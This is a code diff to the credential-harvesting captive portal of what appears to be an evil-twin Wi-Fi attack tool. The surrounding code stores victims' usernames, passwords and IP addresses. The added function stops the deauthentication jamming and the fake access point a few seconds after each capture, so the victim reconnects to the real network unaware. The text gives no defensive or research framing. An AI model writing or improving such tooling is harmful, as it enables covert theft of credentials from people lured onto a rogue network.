@@ -4,6 +4,7 @@ import http.server
 import socketserver
 import os
 import sqlite3
+import subprocess
 import urllib.parse
 import json
 from datetime import datetime
@@ -69,6 +70,22 @@ def save_credentials(username, password, user_agent, ip_address, portal_page):
         print(f"Error saving credentials: {e}")
         return False
 
+
+def release_victim():
+    """After a capture, let the success page load, then stop the jamming and the
+    fake AP so the victim's device reconnects to the real network on its own.
+    Detached so it survives the portal being torn down together with the AP."""
+    try:
+        subprocess.Popen(
+            ["/bin/sh", "-c",
+             "sleep 6; systemctl stop fennec-mirage-deauth; systemctl stop fennec-mirage"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            start_new_session=True,
+        )
+    except Exception as e:
+        print(f"[MIRAGE] release failed: {e}")
+
+
 class H(http.server.SimpleHTTPRequestHandler):
     def __init__(self, *a, **k):
         super().__init__(*a, directory=PORTAIL, **k)
@@ -111,6 +128,7 @@ class H(http.server.SimpleHTTPRequestHandler):
         if username or password:
             save_credentials(username, password, user_agent, ip_address, portal_page)
             print(f"[MIRAGE] Credentials captured: {username}")
+            release_victim()
 
         # Redirect to a success page after submission.
         self.send_response(302)
